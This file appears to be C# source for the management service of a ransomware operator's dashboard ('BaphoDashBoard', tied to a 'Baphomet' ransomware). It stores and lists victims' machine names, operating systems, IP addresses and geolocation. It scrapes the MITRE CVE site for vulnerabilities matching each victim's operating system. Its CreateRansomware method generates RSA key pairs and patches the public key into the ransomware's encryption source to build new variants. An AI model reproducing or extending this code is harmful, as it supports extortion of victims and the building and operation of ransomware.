using BaphoDashBoard.Models;
using Microsoft.EntityFrameworkCore;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using HtmlAgilityPack;
using ScrapySharp.Extensions;
using ScrapySharp.Network;
using BaphoDashBoard.DTO;
using BaphoDashBoard.ViewModels;
using System.IO;

namespace BaphoDashBoard.DAL.Services
{
    public class ManagementService : BaseService
    {
        public ManagementService(MyLocalDatabase context) : base(context)
        {
        }
        static ScrapingBrowser _browser = new ScrapingBrowser();
        public async Task<List<Administrators>> GetAdmin()
        {
            List<Administrators> result = new List<Administrators>();

            result = _context.Administrators.Select(x => new Administrators()
            {
                Id = x.Id,
                Username = x.Username,
                Password = x.Password,
                PasswordHash = x.PasswordHash
            }).ToList();

            return result;
        }

        public async Task<List<VictimDetail>> GetRecordList()
        {
            List<VictimDetail> result = new List<VictimDetail>();
            try
            {
                result = await _context.VictimDetail.ToListAsync();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return result;
        }

        public async Task<AppResult> Delete(int id)
        {
            AppResult result = new AppResult();
            try
            {
                var record_to_delete = await _context.VictimDetail.Where(x => x.Id == id).FirstOrDefaultAsync();
                if (record_to_delete != null)
                {
                    _context.VictimDetail.Remove(record_to_delete);
                    await _context.SaveChangesAsync();
                    result.success = true;
                    result.message = "record delete";
                }
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<List<RansomDetailsViewModel>> GetRansomwareDetails()
        {
            List<RansomDetailsViewModel> ransomwaredetails = new List<RansomDetailsViewModel>();
            try
            {
                ransomwaredetails = await _context.Ransomware.Select(x => new RansomDetailsViewModel()
                {
                    Name = x.Name,
                    Description = x.Description,
                    Date = x.ReleaseDate.ToShortDateString()

                }).ToListAsync();
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.Message);

            }
            return ransomwaredetails;
        }

        public async Task<DetailsViewModel> Details(int id)
        {
            DetailsViewModel victimdetails = new DetailsViewModel();
            try
            {
                victimdetails = await _context.VictimDetail.Where(x => x.Id == id).Select(s => new DetailsViewModel()
                {
                    Id = s.Id,
                    MachineName = s.MachinName,
                    Machine_OS = s.MachineOS,
                    HostName = s.Hostname,
                    Ip = s.Ip,
                    Country = s.Country,
                    City = s.City,
                    PostalCode = s.PostalCode,
                    Latitude = s.Lat,
                    Longitude = s.Lng,
                    Region = s.Region,
                }).FirstOrDefaultAsync();

                var url = "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=" + victimdetails.Machine_OS.Replace(" ", "+");
                var pagelinks = GetPageLinks(url);

                victimdetails.CveInfo = pagelinks;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            return victimdetails;
        }

        static List<NameAndValueDTO> GetPageLinks(string url)
        {
            List<NameAndValueDTO> info = new List<NameAndValueDTO>();
            var cve_info = "";
            var cve_name = "";

            var html = GetHtmlContent(url);
            var links = html.CssSelect("td");
            foreach (var link in links)
            {
                //if (link.Attributes["href"].Value.Contains("cvename"))
                //{
                //    homePageLinks.Add(link.Attributes["href"].OwnerNode.InnerHtml);
                //}

                if (link.Attributes.Contains("valign") && !link.Attributes.Contains("nowrap"))
                {
                    cve_info = link.Attributes["valign"].OwnerNode.InnerHtml;
                }
                if (link.Attributes.Contains("valign") && link.Attributes.Contains("nowrap"))
                {
                    cve_name = link.InnerText;
                }

                if(cve_name != "" && cve_info != "")
                {
                    info.Add(new NameAndValueDTO() { Title = cve_name, Description = cve_info });
                }
            }
            return info;
        }

        static HtmlNode GetHtmlContent(string url)
        {
            WebPage webpage = _browser.NavigateToPage(new Uri(url));
            return webpage.Html;
        }

        public async Task<AppResult> CreateRansomware(GenerateRansomwareDTO model)
        {
            AppResult result = new AppResult();
            try
            {
                model.HostsList.AddRange(model.Hosts.Trim('[', ']').Split(",").Select(x => x.Trim('"')).ToArray());
                var rsa_keys = GenerateRsaKeys();

                var edit_ransomware = EditBaphometFiles(rsa_keys.PublicKey);

                Ransomware ransomware = new Ransomware()
                {
                    Name = model.Name,
                    Description = model.Description,
                    ReleaseDate = DateTime.Now,
                    PublicKey = rsa_keys.PublicKey,
                    PrivateKey = rsa_keys.PrivateKey
                };
               // _context.Ransomware.Add(ransomware);
              //  await _context.SaveChangesAsync();
            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult> EditBaphometFiles(string public_key)
        {
            AppResult result = new AppResult();
            try
            { 
                var getpath = Directory.GetCurrentDirectory();
                var main_path = getpath.Remove(getpath.Length - 15);
                main_path = Path.Combine(main_path, "Tools","Baphomet");

                var draw_rsa_key = DrawParameters(Path.Combine(main_path, "Utilities"), "CryptRSA.cs", public_key, "<public key here>");

            }
            catch(Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;
        }

        public async Task<AppResult> DrawParameters(string file_path, string file ,string parameter, string refence_value)
        {
            AppResult result = new AppResult();
            try
            {
                var file_location = Path.Combine(file_path, file);
                var file_content = File.ReadAllText(file_location);
                file_content = file_content.Replace(refence_value, parameter);
                File.WriteAllText(file_location, file_content);

                //tengo un problem, como parametro recivo string o array, debo buscar la manera de dibujar linea por lines los array.

                //string[] file_content = File.ReadAllLines(file_location);
                //foreach(var line in file_content)
                //{
                //    if (line.Contains(refence_value))
                //    {
                //        var new_value = line.Replace(refence_value, parameter);
                //        file_content
                //    }
                //}
            }
            catch (Exception ex)
            {
                result.success = false;
                result.message = ex.Message;
            }
            return result;

        }
    }
}
